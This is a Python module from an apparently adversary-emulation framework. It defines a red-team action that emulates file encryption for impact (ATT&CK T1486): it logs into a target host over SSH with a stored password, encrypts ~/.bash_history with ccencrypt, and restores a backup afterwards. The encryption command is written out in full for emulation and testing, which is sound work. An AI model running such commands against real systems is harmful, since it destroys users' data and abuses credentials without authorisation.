"""
Module defines the class to execute data encrypted for impact in the emulator.
"""

from __future__ import annotations
import os
from .emulate_red_action_base import EmulateRedAction

file_path = os.path.realpath(__file__)
dir_name = os.path.dirname(file_path)


class EmulateDataEncryptedForImpact(EmulateRedAction):
    """
    Class to exeucte data encrypted for impact in the emulator.
    """

    name = "Data Encrypted for Impact"

    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.name = EmulateDataEncryptedForImpact.name

    def build_emulator_cmd(
        self,
        user_input_file_path="~/.bash_history",
        cped_file_path="/tmp/.bash_history",
        impact_command="echo done",
    ):
        """
        Construct shell command to execute data encrypted for impact.
        This attack assumes attack is executed as a user and not as ROOT,
        thus the ~/.bash_history file is encrypted and not the /etc/passwd file.
        Refer to ART T1486 Atomic Test #3 for the full command.


        Argrument:
            file - target file to encrypt

        Returns:
            shell_cmd - full shell command that runs in a subprocess.
        """
        host_user = EmulateRedAction.emu_config["firewheel"]["host"]["username"]
        host_pwd = EmulateRedAction.emu_config["firewheel"]["host"]["password"]

        action_cmd_arr = [
            f"'sshpass -p {host_pwd}",
            f"ssh -o StrictHostKeyChecking=accept-new {host_user}@{self.target_host.ip_address}",
            f'"cp {user_input_file_path} {cped_file_path} \;',
            f"ccencrypt -f -K key {user_input_file_path} \;",
            f"file {user_input_file_path}.cpt \;",
            f"{impact_command} \;",
            # Clean up command
            f"cp {cped_file_path} {user_input_file_path}\"'",
        ]
        action_cmd = " ".join(action_cmd_arr)
        shell_cmd = self.prefix_emulator_cmd(action_cmd)
        return shell_cmd
